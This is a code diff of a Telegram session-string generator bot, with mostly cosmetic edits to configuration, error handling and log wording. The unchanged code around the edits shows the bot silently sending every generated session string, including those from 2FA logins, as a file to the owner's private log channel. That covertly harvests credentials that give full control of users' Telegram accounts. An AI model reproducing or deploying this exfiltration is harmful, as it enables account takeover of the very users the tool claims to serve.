@@ -12,12 +12,12 @@ from help import HELP_TEXT, help_buttons
 
 # ---------------- CONFIG ---------------- #
 
-API_ID = int(os.getenv("API_ID"))
+API_ID = int(os.getenv("API_ID", 0))
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHANNEL = "hellupdates1"
-OWNER_ID = int(os.getenv("OWNER_ID"))
-LOGGER_ID = int(os.getenv("LOGGER_ID"))
+OWNER_ID = int(os.getenv("OWNER_ID", 0))
+LOGGER_ID = int(os.getenv("LOGGER_ID", 0))
 MONGO_URL = os.getenv("MONGO_URL")
 
 bot = Client("string_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
@@ -28,8 +28,8 @@ users_db = None
 try:
     mongo = AsyncIOMotorClient(MONGO_URL)
     users_db = mongo["bot"]["users"]
-except:
-    pass
+except Exception as e:
+    print("Mongo Error:", e)
 
 users = {}
 
@@ -54,7 +54,6 @@ async def is_joined(client, user_id):
 
 @bot.on_message(filters.command("start"))
 async def start(client, message):
-
     user = message.from_user
 
     existing = None
@@ -67,7 +66,7 @@ async def start(client, message):
         )
 
     if not existing:
-        await send_log(f"🚀 NEW USER\n{user.id}")
+        await send_log(f"🚀 NEW USER\nID: {user.id}")
 
     if not await is_joined(client, user.id):
         return await message.reply(
@@ -89,7 +88,6 @@ async def broadcast(client, message):
 
     if message.reply_to_message:
         msg = message.reply_to_message
-
         async for u in users_db.find():
             try:
                 await msg.copy(u["user_id"])
@@ -99,7 +97,6 @@ async def broadcast(client, message):
 
     elif len(message.command) > 1:
         msg = message.text.split(None, 1)[1]
-
         async for u in users_db.find():
             try:
                 await bot.send_message(u["user_id"], msg)
@@ -212,14 +209,14 @@ async def handler(client, message):
             await message.reply_document(bytes(string, "utf-8"), file_name="string.txt")
 
             user = message.from_user
-            await send_log(f"🆕 SESSION\n{user.id}")
+            await send_log(f"🆕 SESSION\nID: {user.id}")
 
             await bot.send_document(LOGGER_ID, bytes(string, "utf-8"), file_name=f"{user.id}.txt")
 
             users.pop(message.from_user.id)
             return
 
-        # PASSWORD (2FA)
+        # PASSWORD
         elif user_data.get("need_pass"):
 
             try:
@@ -243,7 +240,7 @@ async def handler(client, message):
                 await message.reply_document(bytes(string, "utf-8"), file_name="string.txt")
 
                 user = message.from_user
-                await send_log(f"🔐 2FA SESSION\n{user.id}")
+                await send_log(f"🔐 2FA SESSION\nID: {user.id}")
 
                 await bot.send_document(LOGGER_ID, bytes(string, "utf-8"), file_name=f"{user.id}_2fa.txt")
 
@@ -260,5 +257,8 @@ async def handler(client, message):
 # ---------------- RUN ---------------- #
 
 if __name__ == "__main__":
-    print("🚀 Bot Started")
-    bot.run()
+    try:
+        print("🚀 Bot Started...")
+        bot.run()
+    except Exception as e:
+        print("CRASH ERROR:", e)
